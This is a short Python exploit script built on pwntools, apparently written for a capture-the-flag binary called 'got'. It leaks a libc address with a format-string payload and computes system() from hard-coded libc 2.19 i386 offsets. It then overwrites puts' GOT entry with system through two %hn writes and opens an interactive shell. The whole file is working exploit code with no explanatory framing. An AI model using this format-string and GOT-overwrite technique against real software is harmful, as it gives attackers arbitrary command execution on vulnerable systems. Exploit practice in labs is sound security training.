#!/usr/bin/python
from pwn import * 

# context.log_level = 'debug'
p = process('got')

# function 1 
# leak and calc system_addr
payload1 = "%35$08x"

p.sendline(payload1)
main_ret = int(p.recv(8),16)
log.debug("main_ret = " + hex(main_ret))

# libc-database (id libc6_2.19-0ubuntu6.9_i386)
offset___libc_start_main_ret = 0x19af3
offset_system = 0x00040310
offset_dup2 = 0x000db920
offset_read = 0x000daf60
offset_write = 0x000dafe0
offset_str_bin_sh = 0x16084c

system_addr = main_ret - offset___libc_start_main_ret + offset_system
log.debug("system addr = " + hex(system_addr))

# function 2
# overwrite puts_got to system
puts_got = 0x0804a010
pad1 = (system_addr & 0xffff) - 8
pad2 = (system_addr >> 16 & 0xffff) - pad1 - 8

payload2 =  p32(puts_got) + p32(puts_got+2)
payload2 += "%%%dc" % (pad1) + "%6$hn"
payload2 += "%%%dc" % (pad2) + "%7$hn"
p.recv()
p.sendline(payload2)
p.interactive()